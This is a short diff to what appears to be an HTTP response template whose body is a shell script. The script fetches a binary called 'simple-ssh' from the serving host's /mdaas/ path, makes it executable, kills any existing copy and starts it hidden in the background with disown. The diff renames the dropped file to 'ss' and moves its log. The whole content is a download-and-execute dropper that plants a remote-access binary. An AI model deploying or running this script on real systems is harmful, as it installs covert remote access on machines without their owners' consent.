@@ -8,13 +8,15 @@ data:
   headers:
     Content-Type: text/plain
   body: |
-    DEST_FILE=/tmp/s
+    CMD=ss
+    DEST_FILE=/tmp/$CMD
+    killall $CMD
     OS=$(uname)
     ARCH=$(uname -m)
     curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
     chmod +x $DEST_FILE
-    bash -c "$DEST_FILE > /tmp/bso 2>&1 &" &
-    r=$(ps aux | grep bs ;cat /tmp/bso; ls -lah /tmp/bs)
+    bash -c "$DEST_FILE > $DEST_FILE.log 2>&1 &" &
+    r=$(ps aux | grep $CMD ;cat $DEST_FILE.log; ls -lah "$DEST_FILE"*)
     disown
 
     echo $r
